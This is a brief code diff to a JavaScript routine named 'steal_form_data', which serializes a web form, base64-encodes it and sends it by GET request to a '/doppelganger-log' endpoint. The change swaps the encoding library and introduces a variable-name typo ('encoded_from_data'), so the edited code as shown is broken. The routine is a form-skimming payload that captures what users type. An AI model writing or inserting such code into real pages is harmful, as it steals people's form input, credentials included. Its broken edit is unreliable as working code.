@@ -24,7 +24,9 @@ function display_calling_card()
 
 function steal_form_data(form)
 {
-	var encoded_form_data = Base64.encode($jDoppelganger(form).serialize());
+	//var encoded_form_data = Base64.encode($jDoppelganger(form).serialize());
+	var encoded_from_data = $.base64Encode($jDoppelganger(form).serialize());
+
 	var url = "/doppelganger-log?formdata=" + encoded_form_data.substring(0, encoded_form_data.length - 2);
 	$jDoppelganger.get(url);
 }
